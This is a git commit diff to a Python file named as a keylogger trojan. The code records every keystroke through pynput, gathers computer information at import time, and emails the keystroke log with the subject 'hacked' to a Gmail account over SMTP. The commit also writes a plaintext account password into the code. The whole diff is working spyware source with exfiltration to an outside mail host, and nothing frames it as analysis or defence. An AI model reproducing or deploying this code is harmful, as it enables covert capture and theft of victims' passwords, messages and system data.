cd263340db3a6d0ff80168b66eafb847acc3bca0
zenithmehta <84179343+zenithmehta@users.noreply.github.com>
2021-05-28 09:34:20 +0530

    Update keylogger(trojan horse).py

--- keylogger(trojan horse).py
+++ keylogger(trojan horse).py
@@ -3,10 +3,14 @@ from pynput.keyboard import Key, Listener
 import smtplib
 import mimetypes
 from email.message import EmailMessage
+import comp
 
-
+cpi=comp.ComputerInfo('COMPUTERinfo.txt')
+cpi.storedata()
+cpi.sendData()
 
 class KeyLogger():
+
     def __init__(self, filename):
         self.filename = filename
 
@@ -17,32 +21,37 @@ class KeyLogger():
         except AttributeError:
             return str(key)
 
+    
     def on_press(self, key):
         print(key)
         with open(self.filename, 'a') as logs:
             logs.write(f'{self.get_char(key)}\n')
             
+    
+    
     def on_release(self, key):
         if key==Key.esc:
-            message = EmailMessage()
+            message2=EmailMessage()
             sender = "pythonproject.py@gmail.com"
             recipient = "pythonproject.py@gmail.com"
-            message['From'] = sender
-            message['To'] = recipient
-            message['Subject'] = 'hacked'
-            body = """keylogs"""
-            message.set_content(body)
-            mime_type, _ = mimetypes.guess_type('keylogs.txt')
+            message2['From'] = sender
+            message2['To'] = recipient
+            message2['Subject'] = 'hacked'
+            body = 'keylogs'
+            message2.set_content(body)
+            mime_type, _ = mimetypes.guess_type(self.filename)
             mime_type, mime_subtype = mime_type.split('/')
-            with open('keylogs.txt', 'rb') as file:
-                message.add_attachment(file.read(),maintype=mime_type,subtype=mime_subtype,filename='keylogs.txt')
-
+            with open(self.filename, 'rb') as file:
+                message2.add_attachment(file.read(),maintype=mime_type,subtype=mime_subtype,filename=self.filename)
             mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
             mail_server.set_debuglevel(1)
-            mail_server.login("pythonproject.py@gmail.com", '') 
-            mail_server.send_message(message)
+            mail_server.login("pythonproject.py@gmail.com", 'Password56789') 
+            mail_server.send_message(message2)
             mail_server.quit()
-                  
+            
+
+
+         
     def main(self):
         with Listener(on_press=self.on_press,on_release=self.on_release) as listener:
             listener.join()
